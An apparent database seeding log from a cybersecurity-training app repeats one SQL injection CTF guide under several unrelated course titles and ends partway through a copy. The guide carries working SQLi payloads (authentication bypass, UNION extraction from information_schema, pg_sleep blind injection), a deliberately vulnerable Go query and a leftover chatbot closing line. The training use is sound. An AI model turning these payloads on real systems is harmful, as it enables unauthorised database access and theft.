2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.481ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 3 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.534ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 6 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomStudentModel.go:29
[0m[33m[6.910ms] [34;1m[rows:1][0m INSERT INTO "room_students" ("created_at","updated_at","deleted_at","member_id","room_id") VALUES ('2025-06-09 14:07:53.423','2025-06-09 14:07:53.423',NULL,3,6) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.035ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.013ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.431','2025-06-09 14:07:53.431',NULL,'weak password policies','Exploring the risks of simple passwords and poor credential management',150,2) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.546ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.024ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 1 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.618ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.44','2025-06-09 14:07:53.44',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.573ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.766ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.448','2025-06-09 14:07:53.448',NULL,'phishing attack simulation','How attackers trick users via deceptive emails and links',200,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.485ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.612ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 2 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.772ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.456','2025-06-09 14:07:53.456',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,2) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.586ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.766ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.463','2025-06-09 14:07:53.463',NULL,'unpatched software vulnerabilities','The dangers of failing to update systems and applications',180,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.453ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.801ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 3 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.530ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.471','2025-06-09 14:07:53.471',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.605ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.656ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.479','2025-06-09 14:07:53.479',NULL,'man-in-the-middle attacks','How attackers intercept and manipulate network communications',250,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.417ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.598ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 4 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.083ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.486','2025-06-09 14:07:53.486',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.709ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[9.997ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.497','2025-06-09 14:07:53.497',NULL,'insecure wi-fi networks','Risks of using public or poorly secured wireless networks',150,2) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.411ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.548ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 5 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.504ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.504','2025-06-09 14:07:53.504',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
